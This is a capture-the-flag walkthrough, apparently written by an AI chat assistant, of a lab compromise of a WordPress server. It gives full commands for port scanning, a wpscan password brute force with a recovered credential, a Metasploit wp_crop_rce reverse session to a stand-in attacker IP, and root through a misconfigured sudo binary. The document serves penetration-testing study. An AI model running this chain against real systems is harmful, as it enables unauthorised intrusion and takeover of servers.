# Blog


Correct — for GitHub and for technical reviewers, you *do* need the commands.
Below is a **clean, recruiter-oriented but technically complete write-up**, structured, readable, and professional.

---

# WordPress Compromise & Linux Privilege Escalation

**Full Attack Chain – Technical Walkthrough**

---

## 📌 Overview

This lab demonstrates a complete compromise of a Linux server hosting a vulnerable WordPress instance. The attack chain included:

* Network enumeration
* Web application discovery
* Credential compromise
* Authenticated Remote Code Execution
* Linux privilege escalation to root

The methodology follows a realistic penetration testing workflow.

---

# 1️⃣ Reconnaissance & Enumeration

## Full Port Scan

```bash
nmap -n -Pn -p- --min-rate 5000 -T4 <TARGET_IP>
```

### Open Ports Identified

* 22 → SSH
* 80 → HTTP
* 139 → SMB
* 445 → SMB
* 9452 → Web service

---

## Service & Version Detection

```bash
nmap -p22,80,139,445,9452 -sSCV --min-rate 5000 -T4 <TARGET_IP>
```

The HTTP service revealed a **WordPress installation**, shifting focus to CMS enumeration.

---

# 2️⃣ Web Enumeration

## Directory Fuzzing

```bash
gobuster dir -u http://<TARGET_IP> \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

### Interesting Endpoints Found

* `/wp-login.php`
* `/wp-admin`
* `/wp-includes`

Before continuing, the domain was added to `/etc/hosts` for proper resolution.

---

# 3️⃣ WordPress Enumeration

## User Enumeration

```bash
wpscan --url http://<TARGET_IP> -e u
```

Valid WordPress users were identified.

---

# 4️⃣ Credential Attack

A password attack was conducted using a common wordlist:

```bash
wpscan --url http://<TARGET_IP>/ \
--passwords /usr/share/wordlists/rockyou.txt \
--usernames <USER_FILE>
```

### Valid Credentials Discovered

```
kwheel : cutiepie1
```

This confirmed weak password controls.

---

# 5️⃣ Exploitation – Remote Code Execution

Although a Searchsploit exploit was available, it proved unstable during testing and was discarded.

Instead, the `wp_crop_rce` module in Metasploit was used.

```bash
msfconsole -q
search wp_crop
use exploit/unix/webapp/wp_crop_rce
show options
set RHOSTS blog.thm
set VHOST blog.thm
set USERNAME kwheel
set PASSWORD cutiepie1
set LHOST <ATTACKER_IP>
set LPORT 4444
run
```

A Meterpreter session was successfully established.

---

# 6️⃣ Post-Exploitation

## Spawn Interactive Shell

```bash
shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

Shell stabilization ensured proper command execution and navigation.

---

# 7️⃣ Privilege Escalation

## Check Sudo Privileges

```bash
sudo -l
```

A privileged binary was identified:

```
/usr/sbin/checker
```

### Environment Variable Manipulation

```bash
export admin=1
/usr/sbin/checker
```

Root access was obtained.

### Verification

```bash
whoami
```

Output:

```
root
```

---

# 8️⃣ Flag Discovery

After manual filesystem enumeration, `user.txt` was located in:

```
/media/usb
```

This required thorough directory exploration beyond standard home paths.

---

# 🔎 Technical Competencies Demonstrated

* Full TCP enumeration
* WordPress attack surface analysis
* Credential brute-force testing
* Exploit validation & decision-making
* Authenticated RCE exploitation
* Shell stabilization techniques
* Linux privilege escalation via environment manipulation
* Structured penetration testing workflow

---

# 🎯 Conclusion

This engagement demonstrates the ability to:

* Identify realistic attack vectors
* Validate vulnerabilities responsibly
* Avoid unreliable exploitation paths
* Chain misconfigurations into full system compromise
* Escalate privileges through Linux misconfiguration analysis

The attack required combining web exploitation with local privilege escalation techniques, reflecting real-world penetration testing scenarios.

---

If you'd like, I can now:

* Optimize this specifically for OSCP-style reporting
* Make a slightly shorter version for GitHub readability
* Add a professional executive summary header section
* Refactor it into your standard reusable write-up template for all future labs



